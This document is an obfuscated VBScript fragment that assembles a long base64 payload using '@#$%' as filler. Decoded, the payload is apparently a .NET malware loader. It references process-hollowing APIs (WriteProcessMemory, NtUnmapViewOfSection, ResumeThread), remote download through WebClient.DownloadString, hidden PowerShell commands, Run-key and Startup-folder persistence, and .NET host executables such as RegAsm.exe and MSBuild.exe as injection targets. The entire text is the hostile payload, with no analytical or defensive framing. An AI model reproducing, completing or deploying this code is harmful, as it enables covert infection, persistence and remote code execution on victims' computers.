hTpxRu = hTpxRu & "ENvbnRleHRWYWx1ZW@#$%x@#$%E1pY3Jvc29mdC5" 
hTpxRu = hTpxRu & "WaXN1YWxCYXNpYy5NeVNlcnZpY2VzLkludGVybmF" 
hTpxRu = hTpxRu & "s@#$%GdldF9WYWx1ZQBzZXRfVmFsdWU@#$%RzE2Q" 
hTpxRu = hTpxRu & "XJhSTNZNnVEMUtyaXhmWQB3MmlGZmxJMmdhd3JaU" 
hTpxRu = hTpxRu & "lVlSTZY@#$%EdldEluc3RhbmNl@#$%HJlc291cmN" 
hTpxRu = hTpxRu & "lTWFu@#$%HJlc291cmNlQ3VsdHVyZQBnZXRfUmVz" 
hTpxRu = hTpxRu & "b3VyY2VNYW5hZ2Vy@#$%FJlc291cmNlTWFuYWdlc" 
hTpxRu = hTpxRu & "gBTeXN0ZW0uUmVzb3VyY2Vz@#$%GdldF9Bc3NlbW" 
hTpxRu = hTpxRu & "JseQBBc3NlbWJseQBnZXRfQ3VsdHVyZQBDdWx0dX" 
hTpxRu = hTpxRu & "JlSW5mbwBTeXN0ZW0uR2xvYmFsaXphdGlvbgBzZX" 
hTpxRu = hTpxRu & "RfQ3VsdHVyZQBWYWx1ZQBKTktYZWltb3ZsRllNb0" 
hTpxRu = hTpxRu & "43WTk@#$%UmVmZXJlbmNlRXF1YWxz@#$%EppTFVv" 
hTpxRu = hTpxRu & "VXQ2cVJGRDBaaUpoW@#$%BtY3BveUROeDFlTjJBT" 
hTpxRu = hTpxRu & "VBTN04@#$%Tm5rYXc0eUxzN0pubmJrbGRI@#$%EN" 
hTpxRu = hTpxRu & "1bHR1cmU@#$%ZGVmYXVsdEluc3RhbmNl@#$%Gdld" 
hTpxRu = hTpxRu & "F9EZWZhdWx0@#$%FRSSkpBNjgxSVNkVUM0OXNXSw" 
hTpxRu = hTpxRu & "BTZXR0aW5nc0Jhc2U@#$%U3luY2hyb25pemVk@#$" 
hTpxRu = hTpxRu & "%ENLY01xOHBIckNQNUVnU2NrbgBCeTc2ckwxdVRx" 
hTpxRu = hTpxRu & "c2NoMVR1YVg@#$%RWhYRXFoNjg3czVkMzkwQm1z@" 
hTpxRu = hTpxRu & "#$%ERlZmF1bHQ@#$%Z2V0X1NldHRpbmdz@#$%GhL" 
hTpxRu = hTpxRu & "eExZVzcxQzJmYkNkbWZrTgBTZXR0aW5ncwBWQUk@" 
hTpxRu = hTpxRu & "#$%UUJYdFg@#$%c3RhcnR1c@#$%BzdGFydHVwX3J" 
hTpxRu = hTpxRu & "lZwBSZWdpc3RyeUtleQBNaWNyb3NvZnQuV2luMzI" 
hTpxRu = hTpxRu & "@#$%R3VpZ@#$%BQcm9jZXNzU3RhcnRJbmZv@#$%E" 
hTpxRu = hTpxRu & "V4Y2VwdGlvbgBXZWJDbGllbnQ@#$%U3lzdGVtLk5" 
hTpxRu = hTpxRu & "ld@#$%BFbnVtZXJhYmxl@#$%FN5c3RlbS5MaW5x@" 
hTpxRu = hTpxRu & "#$%FN5c3RlbS5Db3Jl@#$%EFueQBJRW51bWVyYWJ" 
hTpxRu = hTpxRu & "sZW@#$%x@#$%FN5c3RlbS5Db2xsZWN0aW9ucy5HZ" 
hTpxRu = hTpxRu & "W5lcmlj@#$%FByb2Nlc3M@#$%UmVnaXN0cnk@#$%" 
hTpxRu = hTpxRu & "Q3VycmVudFVzZXI@#$%Q29udGFpbnM@#$%RGlyZW" 
hTpxRu = hTpxRu & "N0b3J5SW5mbwBTeXN0ZW0uSU8@#$%RmlsZUluZm8" 
hTpxRu = hTpxRu & "@#$%eVgyblNQS2ppR1FEMVkzYXMw@#$%Gp0ZlEzT" 
hTpxRu = hTpxRu & "UhGZWp0MndjSWkzVQBTZWN1cml0eVByb3RvY29sV" 
hTpxRu = hTpxRu & "HlwZQBTZXJ2aWNlUG9pbnRNYW5hZ2Vy@#$%HNldF" 
hTpxRu = hTpxRu & "9TZWN1cml0eVByb3RvY29s@#$%FUyaHdFblhBcUF" 
hTpxRu = hTpxRu & "QREE3clVpZQBFbmNvZGluZwBTeXN0ZW0uVGV4d@#" 
hTpxRu = hTpxRu & "$%BnZXRfVVRGO@#$%BNUDIxUEZWOWc2NUxBZzNVe" 
hTpxRu = hTpxRu & "E0@#$%c2V0X0VuY29kaW5n@#$%EJnbHdvOWJjOHV" 
hTpxRu = hTpxRu & "qSzhXZXEyMgBTdHJpbmdz@#$%FN0clJldmVyc2U@" 
hTpxRu = hTpxRu & "#$%cThuV1FPbmdKaVRzOGJubkRr@#$%FJlcGxhY2" 
hTpxRu = hTpxRu & "U@#$%clVQUzlYcjgzbnRTY0p5Rksw@#$%GdCd0ZS" 
hTpxRu = hTpxRu & "N01STVpIZUQyOWlmRwBEb3dubG9hZFN0cmluZwBo" 
hTpxRu = hTpxRu & "bmowYm9MeDZ3SmNBTDdPTTE@#$%T3BlcmF0b3Jz@" 
hTpxRu = hTpxRu & "#$%E1pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21waW" 
hTpxRu = hTpxRu & "xlclNlcnZpY2Vz@#$%ENvbXBhcmVTdHJpbmc@#$%" 
hTpxRu = hTpxRu & "YWdCQkxlb1BCSE1EY0c1SEEw@#$%FNwZWNpYWxGb" 
hTpxRu = hTpxRu & "2xkZXI@#$%RW52aXJvbm1lbnQ@#$%R2V0Rm9sZGV" 
hTpxRu = hTpxRu & "yUGF0a@#$%BmdjdGeDRpb3R2eDNoVTZqZWI@#$%T" 
hTpxRu = hTpxRu & "mV3R3VpZ@#$%BhcjhwaGhQU2JxV05SMzNVbEc@#$" 
hTpxRu = hTpxRu & "%Q29uY2F0@#$%G1pM1EwZzNRNXZzQkdEbWkzR@#$" 
hTpxRu = hTpxRu & "%BEaXJlY3Rvcnk@#$%R2V0RmlsZXM@#$%T2RtYlB" 
hTpxRu = hTpxRu & "1MlBZTTQ0UXF4ZFlR@#$%FByb2Nlc3NXaW5kb3dT" 
hTpxRu = hTpxRu & "dHlsZQBzZXRfV2luZG93U3R5bGU@#$%ZXV3MVk2W" 
hTpxRu = hTpxRu & "W1pQUVjOVN0am01@#$%HNldF9GaWxlTmFtZQBZcT" 
hTpxRu = hTpxRu & "M5aE1CZFVsRjVGOVpoMHM@#$%ZW5NVzZjMExxMkV" 
hTpxRu = hTpxRu & "pQ2M5NTN3@#$%HNldF9Bcmd1bWVudHM@#$%WVBuS" 
hTpxRu = hTpxRu & "U9SVXBIUUFGZVNqU0pS@#$%HNldF9TdGFydEluZm" 
hTpxRu = hTpxRu & "8@#$%YWNROVpFRFJsbTZzanBaMVVu@#$%FN0YXJ0" 
hTpxRu = hTpxRu & "@#$%HFtTkhKMzV2ZlhORjM5TWM2c@#$%BPcGVuU3" 
hTpxRu = hTpxRu & "ViS2V5@#$%HE1WEd1MnM3bkhaanFsYk5KNwBHZXR" 
hTpxRu = hTpxRu & "WYWx1ZU5hbWVz@#$%HNETEtXSHVUUWNpUzlwRjc4" 
hTpxRu = hTpxRu & "MQBTZXRWYWx1ZQBJeExLMHU0Sm1uMzBNaGV4aD@#" 
hTpxRu = hTpxRu & "$%@#$%Q2xvc2U@#$%TWlieHJVRWtCeTVRNExyT2E" 
hTpxRu = hTpxRu & "z@#$%ENvbnZlcnQ@#$%RnJvbUJhc2U2NFN0cmluZ" 
hTpxRu = hTpxRu & "wBCeXRl@#$%GtuQWpEM0ZEVTBKN3dhc2FWMwB1N2" 
hTpxRu = hTpxRu & "5VdGh3bE9IVVhaSmdib0U@#$%UDJHNFJSaHFKZG9" 
hTpxRu = hTpxRu & "ZdUU3UUtw@#$%ExUSTdpcnZqYVI2Z0pWaWxOOQBJ" 
hTpxRu = hTpxRu & "bnRlcmFjdGlvbgBDcmVhdGVPYmplY3Q@#$%ZzU5d" 
hTpxRu = hTpxRu & "1JLSn@#$%3b2tTU29LTWdj@#$%G0wbFNZbFdqeGx" 
hTpxRu = hTpxRu & "MRXlXY1l0TwBQcm9qZWN0RGF0YQBTZXRQcm9qZWN" 
hTpxRu = hTpxRu & "0RXJyb3I@#$%Y21tNTBWWml1TXlleE9nWHhO@#$%" 
hTpxRu = hTpxRu & "ENsZWFyUHJvamVjdEVycm9y@#$%Gs2bXVwTFJUaz" 
hTpxRu = hTpxRu & "NqbXBTcHNJZgBOZXdMYXRlQmluZGluZwBMYXRlR2" 
hTpxRu = hTpxRu & "V0@#$%E9NNWV0dWF3dkhVeWk3M2tkRgBDb252ZXJ" 
hTpxRu = hTpxRu & "zaW9ucwBmdFl4U1BHTUJpcGNKZTVZOEs@#$%UGF0" 
hTpxRu = hTpxRu & "a@#$%BHZXRGaWxlTmFtZVdpdGhvdXRFeHRlbnNpb" 
hTpxRu = hTpxRu & "24@#$%cTIyT0xtY0N4NW1UbU9SN0tJ@#$%EZvcm1" 
hTpxRu = hTpxRu & "hd@#$%BkbEtBam56dnVpRXgwMXlFVmI@#$%Q29tY" 
hTpxRu = hTpxRu & "mluZQBXbEl1OERJQX@#$%xang0ZXVxRUgx@#$%EZ" 
hTpxRu = hTpxRu & "pbGU@#$%RXhpc3Rz@#$%GRab2xpM0lJSTUwdHZ3a" 
hTpxRu = hTpxRu & "mI0QWU@#$%akRlMTRoSVRkVnZWaVVsSWxyM@#$%B" 
hTpxRu = hTpxRu & "DaGFuZ2VUeXBl@#$%Hl5bGpRR0lsRE9UUkpEMmZo" 
hTpxRu = hTpxRu & "WkY@#$%TGF0ZVNld@#$%BJeHFWTXRJUzdudHV5SD" 
hTpxRu = hTpxRu & "Y5WG9I@#$%Fc2RUpZU0llOE8zdllsUTlpOFE@#$%" 
hTpxRu = hTpxRu & "R2V0RnVsbFBhdGg@#$%Q2RuUzg2SWtlZWdDakdzY" 
hTpxRu = hTpxRu & "lZwYQBHZXREaXJlY3RvcnlOYW1l@#$%GpiNDl1S0" 
hTpxRu = hTpxRu & "lDNDhYZFk2MkVrNjE@#$%TGF0ZUNhbGw@#$%cDRq" 
hTpxRu = hTpxRu & "N2hsSVF1RUFPcmJIMzg4UwBNYXJzaGFs@#$%FJlb" 
hTpxRu = hTpxRu & "GVhc2VDb21PYmplY3Q@#$%eTJ3YVU0ZjhWZnBiS3" 
hTpxRu = hTpxRu & "NhYXRY@#$%GU1QnhhQTlTVXR5R3BtSVV2UwBDcmV" 
hTpxRu = hTpxRu & "hdGVQcm9jZXNzX0FQSQBhcHBsaWNhdGlvbk5hbWU" 
hTpxRu = hTpxRu & "@#$%Y29tbWFuZExpbmU@#$%SW50UHRy@#$%HByb2" 
hTpxRu = hTpxRu & "Nlc3NBdHRyaWJ1dGVz@#$%HRocmVhZEF0dHJpYnV" 
hTpxRu = hTpxRu & "0ZXM@#$%aW5oZXJpdEhhbmRsZXM@#$%VUludDMy@" 
hTpxRu = hTpxRu & "#$%GNyZWF0aW9uRmxhZ3M@#$%ZW52aXJvbm1lbnQ" 
hTpxRu = hTpxRu & "@#$%Y3VycmVudERpcmVjdG9yeQBzdGFydHVwSW5m" 
hTpxRu = hTpxRu & "bwBwcm9jZXNzSW5mb3JtYXRpb24@#$%Q3JlYXRlU" 
hTpxRu = hTpxRu & "HJvY2VzcwBrZXJuZWwzMi5kbGw@#$%R2V0VGhyZW" 
hTpxRu = hTpxRu & "FkQ29udGV4dF9BUEk@#$%dGhyZWFk@#$%GNvbnRl" 
hTpxRu = hTpxRu & "eHQ@#$%R2V0VGhyZWFkQ29udGV4d@#$%BXb3c2NE" 
hTpxRu = hTpxRu & "dldFRocmVhZENvbnRleHRfQVBJ@#$%FdvdzY0R2V" 
hTpxRu = hTpxRu & "0VGhyZWFkQ29udGV4d@#$%BTZXRUaHJlYWRDb250" 
hTpxRu = hTpxRu & "ZXh0X0FQSQBTZXRUaHJlYWRDb250ZXh0@#$%Fdvd" 
hTpxRu = hTpxRu & "zY0U2V0VGhyZWFkQ29udGV4dF9BUEk@#$%V293Nj" 
hTpxRu = hTpxRu & "RTZXRUaHJlYWRDb250ZXh0@#$%FJlYWRQcm9jZXN" 
hTpxRu = hTpxRu & "zTWVtb3J5X0FQSQBwcm9jZXNz@#$%GJhc2VBZGRy" 
hTpxRu = hTpxRu & "ZXNz@#$%GJ1ZmZlcgBidWZmZXJTaXpl@#$%GJ5dG" 
hTpxRu = hTpxRu & "VzUmVhZ@#$%BSZWFkUHJvY2Vzc01lbW9yeQBXcml" 
hTpxRu = hTpxRu & "0ZVByb2Nlc3NNZW1vcnlfQVBJ@#$%GJ5dGVzV3Jp" 
hTpxRu = hTpxRu & "dHRlbgBXcml0ZVByb2Nlc3NNZW1vcnk@#$%TnRVb" 
hTpxRu = hTpxRu & "m1hcFZpZXdPZlNlY3Rpb25fQVBJ@#$%E50VW5tYX" 
hTpxRu = hTpxRu & "BWaWV3T2ZTZWN0aW9u@#$%G50ZGxsLmRsb@#$%BW" 
hTpxRu = hTpxRu & "aXJ0dWFsQWxsb2NFeF9BUEk@#$%aGFuZGxl@#$%G" 
hTpxRu = hTpxRu & "FkZHJlc3M@#$%bGVuZ3Ro@#$%HR5cGU@#$%cHJvd" 
hTpxRu = hTpxRu & "GVjd@#$%BWaXJ0dWFsQWxsb2NFe@#$%BSZXN1bWV" 
hTpxRu = hTpxRu & "UaHJlYWRfQVBJ@#$%FJlc3VtZVRocmVhZ@#$%BBb" 
hTpxRu = hTpxRu & "mRl@#$%GRhdGE@#$%RW1wdHk@#$%UmFuZG9t@#$%" 
hTpxRu = hTpxRu & "EhhbmRsZVJ1bgBwYXRo@#$%GNtZ@#$%Bjb21wYXR" 
hTpxRu = hTpxRu & "pYmxl@#$%Fplcm8@#$%TWM1T1g5SXg5TEJrZXduO" 
hTpxRu = hTpxRu & "DY4R@#$%BUQlRkU0xJT29Oa2NPdTBWZ3Js@#$%E5" 
hTpxRu = hTpxRu & "leHQ@#$%c0FOSEE0SU44WmVtNTN1TFpCZ@#$%BpM" 
hTpxRu = hTpxRu & "VNaUmtJeVM3eW5DT3VGTDZw@#$%EZpbGVTeXN0ZW" 
hTpxRu = hTpxRu & "1JbmZv@#$%FJlZnJlc2g@#$%Y0NUNlRUSW03a0pH" 
hTpxRu = hTpxRu & "RHBOcnJaeQBGNTNzZVVJZ3VtREJEZWNLV2NW@#$%" 
hTpxRu = hTpxRu & "E1ScWduSElxc1RHZTlMeDVjTVQ@#$%d2xkZjc0SX" 
hTpxRu = hTpxRu & "Rvdll4MW5FcGpVZwBDNkFBRU1JcEdXcDZzQUF4cm" 
hTpxRu = hTpxRu & "lG@#$%HRuU0F0T0kxSkZDdXhuNUJHVkY@#$%U2l6" 
hTpxRu = hTpxRu & "ZU9m@#$%FJnaWNSVEk4cFdldmhwM2NDUXU@#$%SX" 
hTpxRu = hTpxRu & "NOdWxsT3JFbXB0eQBNalM5UFdJNlQ1R0RaU2lnQj" 
hTpxRu = hTpxRu & "V5@#$%HpHTkFZVklqbkpFNEF1Vzd0N1c@#$%Qml0" 
hTpxRu = hTpxRu & "Q29udmVydGVy@#$%FRvSW50MzI@#$%d3gyQnMwSW" 
hTpxRu = hTpxRu & "RMZUdEU2FuRTVjW@#$%BnZXRfU2l6ZQBVSUF5NGp" 
hTpxRu = hTpxRu & "JN0g3b3JXR2h1Y1FP@#$%EludDE2@#$%FRvSW50M" 
hTpxRu = hTpxRu & "TY@#$%bURtNFFDSWZCbXB2bFdTdUVUN@#$%BCdWZ" 
hTpxRu = hTpxRu & "mZXI@#$%QmxvY2tDb3B5@#$%EFycmF5@#$%H@#$%" 
hTpxRu = hTpxRu & "yRkVHNEk5ZkJ1R2llUHdPN0s@#$%R2V0Qnl0ZXM@" 
hTpxRu = hTpxRu & "#$%RXlnVFFnSUtwRmloREV4V1ExM@#$%Btbm8xeE" 
hTpxRu = hTpxRu & "hJSDZUS2lveWc5a3NJ@#$%EdldFByb2Nlc3NCeUl" 
hTpxRu = hTpxRu & "k@#$%FdYcU9SZElYN1E4ajJiTXVLR2Y@#$%S2lsb" 
hTpxRu = hTpxRu & "@#$%BEczRGV1dJVkRtUThRTHJteEhx@#$%FByb2N" 
hTpxRu = hTpxRu & "lc3NIYW5kbGU@#$%VGhyZWFkSGFuZGxl@#$%FByb" 
hTpxRu = hTpxRu & "2Nlc3NJZ@#$%BUaHJlYWRJZ@#$%BTaXplXwBSZXN" 
hTpxRu = hTpxRu & "lcnZlZDE@#$%RGVza3Rvc@#$%BUaXRsZQBkd1g@#" 
hTpxRu = hTpxRu & "$%ZHdZ@#$%GR3WFNpemU@#$%ZHdZU2l6ZQBkd1hD" 
hTpxRu = hTpxRu & "b3VudENoYXJz@#$%GR3WUNvdW50Q2hhcnM@#$%ZH" 
hTpxRu = hTpxRu & "dGaWxsQXR0cmlidXRl@#$%GR3RmxhZ3M@#$%d1No" 
hTpxRu = hTpxRu & "b3dXaW5kb3c@#$%Y2JSZXNlcnZlZDI@#$%UmVzZX" 
hTpxRu = hTpxRu & "J2ZWQy@#$%FN0ZElucHV0@#$%FN0ZE91dHB1d@#$" 
hTpxRu = hTpxRu & "%BTdGRFcnJvcgBGaWJlci5SZXNvdXJjZXMucmVzb" 
hTpxRu = hTpxRu & "3VyY2Vz@#$%EdlbmVyYXRlZENvZGVBdHRyaWJ1dG" 
hTpxRu = hTpxRu & "U@#$%U3lzdGVtLkNvZGVEb20uQ29tcGlsZXI@#$%" 
hTpxRu = hTpxRu & "RWRpdG9yQnJvd3NhYmxlQXR0cmlidXRl@#$%FN5c" 
hTpxRu = hTpxRu & "3RlbS5Db21wb25lbnRNb2Rlb@#$%BFZGl0b3JCcm" 
hTpxRu = hTpxRu & "93c2FibGVTdGF0ZQBEZWJ1Z2dlckhpZGRlbkF0dH" 
hTpxRu = hTpxRu & "JpYnV0ZQBTdGFuZGFyZE1vZHVsZUF0dHJpYnV0ZQ" 
hTpxRu = hTpxRu & "BIaWRlTW9kdWxlTmFtZUF0dHJpYnV0ZQBIZWxwS2" 
hTpxRu = hTpxRu & "V5d29yZEF0dHJpYnV0ZQBTeXN0ZW0uQ29tcG9uZW" 
hTpxRu = hTpxRu & "50TW9kZWwuRGVzaWdu@#$%ERlYnVnZ2VyTm9uVXN" 
hTpxRu = hTpxRu & "lckNvZGVBdHRyaWJ1dGU@#$%Q29tcGlsZXJHZW5l" 
hTpxRu = hTpxRu & "cmF0ZWRBdHRyaWJ1dGU@#$%U3VwcHJlc3NVbm1hb" 
hTpxRu = hTpxRu & "mFnZWRDb2RlU2VjdXJpdHlBdHRyaWJ1dGU@#$%U3" 
hTpxRu = hTpxRu & "lzdGVtLlNlY3VyaXR5@#$%E15R3JvdXBDb2xsZWN" 
hTpxRu = hTpxRu & "0aW9uQXR0cmlidXRl@#$%@#$%@#$%fRgBp@#$%GI" 
hTpxRu = hTpxRu & "@#$%ZQBy@#$%C4@#$%UgBl@#$%HM@#$%bwB1@#$%" 
hTpxRu = hTpxRu & "HI@#$%YwBl@#$%HM@#$%@#$%@#$%so@#$%Pg@#$%" 
hTpxRu = hTpxRu & "Kw@#$%o@#$%Co@#$%@#$%@#$%Ni@#$%@#$%@#$%N" 
hTpxRu = hTpxRu & "fQCRJfo@#$%K@#$%B9@#$%CE@#$%@#$%@#$%Nj@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%LtiX4@#$%P3/fQ@#$%0@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%DZ@#$%@#$%@#$%Cyg@#$%wCWyJSo@#$%HiI@#$%" 
hTpxRu = hTpxRu & "@#$%2U@#$%@#$%BF@#$%@#$%E@#$%@#$%/f+RJU@" 
hTpxRu = hTpxRu & "#$%@#$%KwB@#$%@#$%M@#$%l@#$%@#$%N4@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%R3SEq@#$%E@#$%@#$%HyayJSg@#$%KgCTI" 
hTpxRu = hTpxRu & "Q@#$%Da@#$%@#$%@#$%Ef3/HwR9@#$%P3/GiIeJg" 
hTpxRu = hTpxRu & "@#$%m+@#$%@#$%@#$%@#$%3Q@#$%@#$%@#$%so@#" 
hTpxRu = hTpxRu & "$%Po@#$%HiIo@#$%F0@#$%@#$%@#$%Mx@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%R+g@#$%q@#$%E@#$%@#$%Q@#$%@#$%o@#$%P" 
hTpxRu = hTpxRu & "g@#$%+g@#$%o@#$%@#$%@#$%DMg@#$%@#$%Ec@#$" 
hTpxRu = hTpxRu & "%lKwCSIZMhfQDw@#$%B8mtiU@#$%@#$%zo@#$%@#" 
hTpxRu = hTpxRu & "$%BG2JTo@#$%Iw@#$%eJio@#$%zyUq@#$%DQ@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%Mv@#$%@#$%@#$%DX@#$%@#$%@#$%CS4@" 
hTpxRu = hTpxRu & "#$%dgBi@#$%HM@#$%@#$%@#$%sq@#$%C4@#$%dgB" 
hTpxRu = hTpxRu & "i@#$%HM@#$%@#$%HND@#$%Do@#$%X@#$%BX@#$%G" 
hTpxRu = hTpxRu & "k@#$%bgBk@#$%G8@#$%dwBz@#$%Fw@#$%UwB5@#$" 
hTpxRu = hTpxRu & "%HM@#$%d@#$%Bl@#$%G0@#$%Mw@#$%y@#$%Fw@#$" 
hTpxRu = hTpxRu & "%VwBp@#$%G4@#$%Z@#$%Bv@#$%Hc@#$%cwBQ@#$%" 
hTpxRu = hTpxRu & "G8@#$%dwBl@#$%HI@#$%cwBo@#$%GU@#$%b@#$%B" 
hTpxRu = hTpxRu & "s@#$%Fw@#$%dg@#$%x@#$%C4@#$%M@#$%Bc@#$%H" 
hTpxRu = hTpxRu & "@#$%@#$%bwB3@#$%GU@#$%cgBz@#$%Gg@#$%ZQBs" 
hTpxRu = hTpxRu & "@#$%Gw@#$%LgBl@#$%Hg@#$%ZQ@#$%@#$%cS@#$%" 
hTpxRu = hTpxRu & "@#$%LQBX@#$%Gk@#$%bgBk@#$%G8@#$%dwBT@#$%" 
hTpxRu = hTpxRu & "HQ@#$%eQBs@#$%GU@#$%I@#$%BI@#$%Gk@#$%Z@#" 
hTpxRu = hTpxRu & "$%Bk@#$%GU@#$%bg@#$%g@#$%EM@#$%bwBw@#$%H" 
hTpxRu = hTpxRu & "k@#$%LQBJ@#$%HQ@#$%ZQBt@#$%C@#$%@#$%LQBQ" 
hTpxRu = hTpxRu & "@#$%GE@#$%d@#$%Bo@#$%C@#$%@#$%Kg@#$%u@#$" 
hTpxRu = hTpxRu & "%HY@#$%YgBz@#$%C@#$%@#$%LQBE@#$%GU@#$%cw" 
hTpxRu = hTpxRu & "B0@#$%Gk@#$%bgBh@#$%HQ@#$%aQBv@#$%G4@#$%" 
hTpxRu = hTpxRu & "I@#$%@#$%@#$%W1M@#$%TwBG@#$%FQ@#$%VwBB@#" 
hTpxRu = hTpxRu & "$%FI@#$%RQBc@#$%E0@#$%aQBj@#$%HI@#$%bwBz" 
hTpxRu = hTpxRu & "@#$%G8@#$%ZgB0@#$%Fw@#$%VwBp@#$%G4@#$%Z@" 
hTpxRu = hTpxRu & "#$%Bv@#$%Hc@#$%cwBc@#$%EM@#$%dQBy@#$%HI@" 
hTpxRu = hTpxRu & "#$%ZQBu@#$%HQ@#$%VgBl@#$%HI@#$%cwBp@#$%G" 
hTpxRu = hTpxRu & "8@#$%bgBc@#$%FI@#$%dQBu@#$%@#$%@#$%JU@#$" 
hTpxRu = hTpxRu & "%Bh@#$%HQ@#$%a@#$%@#$%@#$%G1c@#$%UwBj@#$" 
hTpxRu = hTpxRu & "%HI@#$%aQBw@#$%HQ@#$%LgBT@#$%Gg@#$%ZQBs@" 
hTpxRu = hTpxRu & "#$%Gw@#$%@#$%@#$%E@#$%HVM@#$%c@#$%Bl@#$%" 
hTpxRu = hTpxRu & "GM@#$%aQBh@#$%Gw@#$%RgBv@#$%Gw@#$%Z@#$%B" 
hTpxRu = hTpxRu & "l@#$%HI@#$%cw@#$%@#$%D1M@#$%d@#$%Bh@#$%H" 
hTpxRu = hTpxRu & "I@#$%d@#$%B1@#$%H@#$%@#$%@#$%Bt7@#$%D@#$" 
hTpxRu = hTpxRu & "%@#$%fQBf@#$%Hs@#$%MQ@#$%6@#$%E4@#$%fQ@#" 
hTpxRu = hTpxRu & "$%u@#$%Gw@#$%bgBr@#$%@#$%@#$%dQwBy@#$%GU" 
hTpxRu = hTpxRu & "@#$%YQB0@#$%GU@#$%UwBo@#$%G8@#$%cgB0@#$%" 
hTpxRu = hTpxRu & "GM@#$%dQB0@#$%@#$%@#$%ZSQBj@#$%G8@#$%bgB" 
hTpxRu = hTpxRu & "M@#$%G8@#$%YwBh@#$%HQ@#$%aQBv@#$%G4@#$%@" 
hTpxRu = hTpxRu & "#$%Btu@#$%G8@#$%d@#$%Bl@#$%H@#$%@#$%YQBk" 
hTpxRu = hTpxRu & "@#$%C4@#$%ZQB4@#$%GU@#$%L@#$%@#$%w@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%VV@#$%Bh@#$%HI@#$%ZwBl@#$%HQ@#$%U@" 
hTpxRu = hTpxRu & "#$%Bh@#$%HQ@#$%a@#$%@#$%@#$%I1c@#$%aQBu@" 
hTpxRu = hTpxRu & "#$%GQ@#$%bwB3@#$%HM@#$%U@#$%Bv@#$%Hc@#$%" 
hTpxRu = hTpxRu & "ZQBy@#$%FM@#$%a@#$%Bl@#$%Gw@#$%b@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%CXY@#$%MQ@#$%u@#$%D@#$%@#$%@#$%B1w@#" 
hTpxRu = hTpxRu & "$%G8@#$%dwBl@#$%HI@#$%cwBo@#$%GU@#$%b@#$" 
hTpxRu = hTpxRu & "%Bs@#$%C4@#$%ZQB4@#$%GU@#$%@#$%BNB@#$%HI" 
hTpxRu = hTpxRu & "@#$%ZwB1@#$%G0@#$%ZQBu@#$%HQ@#$%cw@#$%@#" 
hTpxRu = hTpxRu & "$%gJkt@#$%Fc@#$%aQBu@#$%GQ@#$%bwB3@#$%FM" 
hTpxRu = hTpxRu & "@#$%d@#$%B5@#$%Gw@#$%ZQ@#$%g@#$%Eg@#$%aQ" 
hTpxRu = hTpxRu & "Bk@#$%GQ@#$%ZQBu@#$%C@#$%@#$%ew@#$%w@#$%" 
hTpxRu = hTpxRu & "H0@#$%I@#$%@#$%t@#$%Fc@#$%aQBu@#$%GQ@#$%" 
hTpxRu = hTpxRu & "bwB3@#$%FM@#$%d@#$%B5@#$%Gw@#$%ZQ@#$%g@#" 
hTpxRu = hTpxRu & "$%Eg@#$%aQBk@#$%GQ@#$%ZQBu@#$%C@#$%@#$%U" 
hTpxRu = hTpxRu & "wB0@#$%GE@#$%cgB0@#$%C0@#$%UwBs@#$%GU@#$" 
hTpxRu = hTpxRu & "%ZQBw@#$%C@#$%@#$%NQ@#$%7@#$%C@#$%@#$%Uw" 
hTpxRu = hTpxRu & "B0@#$%GE@#$%cgB0@#$%C0@#$%U@#$%By@#$%G8@" 
hTpxRu = hTpxRu & "#$%YwBl@#$%HM@#$%cw@#$%g@#$%Hs@#$%MQB9@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%hVwBv@#$%HI@#$%awBp@#$%G4@#$%Z" 
hTpxRu = hTpxRu & "wBE@#$%Gk@#$%cgBl@#$%GM@#$%d@#$%Bv@#$%HI" 
hTpxRu = hTpxRu & "@#$%eQ@#$%@#$%F0Q@#$%ZQBz@#$%GM@#$%cgBp@" 
hTpxRu = hTpxRu & "#$%H@#$%@#$%d@#$%Bp@#$%G8@#$%bg@#$%@#$%E" 
hTpxRu = hTpxRu & "00@#$%aQBj@#$%HI@#$%bwBz@#$%G8@#$%ZgB0@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%XVwBp@#$%G4@#$%Z@#$%Bv@#$%Hc@#" 
hTpxRu = hTpxRu & "$%UwB0@#$%Hk@#$%b@#$%Bl@#$%@#$%@#$%JUwBh" 
hTpxRu = hTpxRu & "@#$%HY@#$%ZQ@#$%@#$%G0E@#$%c@#$%Bw@#$%Ew" 
hTpxRu = hTpxRu & "@#$%YQB1@#$%G4@#$%YwBo@#$%C4@#$%ZQB4@#$%" 
hTpxRu = hTpxRu & "GU@#$%@#$%C1h@#$%HM@#$%c@#$%Bu@#$%GU@#$%" 
hTpxRu = hTpxRu & "d@#$%Bf@#$%HI@#$%ZQBn@#$%GI@#$%cgBv@#$%H" 
hTpxRu = hTpxRu & "c@#$%cwBl@#$%HI@#$%cw@#$%u@#$%GU@#$%e@#$" 
hTpxRu = hTpxRu & "%Bl@#$%@#$%@#$%VYwB2@#$%HQ@#$%cgBl@#$%HM" 
hTpxRu = hTpxRu & "@#$%LgBl@#$%Hg@#$%ZQ@#$%@#$%E2k@#$%b@#$%" 
hTpxRu = hTpxRu & "Bh@#$%HM@#$%bQ@#$%u@#$%GU@#$%e@#$%Bl@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%PagBz@#$%GM@#$%LgBl@#$%Hg@#$%ZQ@" 
hTpxRu = hTpxRu & "#$%@#$%F00@#$%UwBC@#$%HU@#$%aQBs@#$%GQ@#" 
hTpxRu = hTpxRu & "$%LgBl@#$%Hg@#$%ZQ@#$%@#$%FVI@#$%ZQBn@#$" 
hTpxRu = hTpxRu & "%EE@#$%cwBt@#$%C4@#$%ZQB4@#$%GU@#$%@#$%B" 
hTpxRu = hTpxRu & "dS@#$%GU@#$%ZwBT@#$%HY@#$%YwBz@#$%C4@#$%" 
hTpxRu = hTpxRu & "ZQB4@#$%GU@#$%@#$%FtD@#$%Do@#$%X@#$%BX@#" 
hTpxRu = hTpxRu & "$%Gk@#$%bgBk@#$%G8@#$%dwBz@#$%Fw@#$%TQBp" 
hTpxRu = hTpxRu & "@#$%GM@#$%cgBv@#$%HM@#$%bwBm@#$%HQ@#$%Lg" 
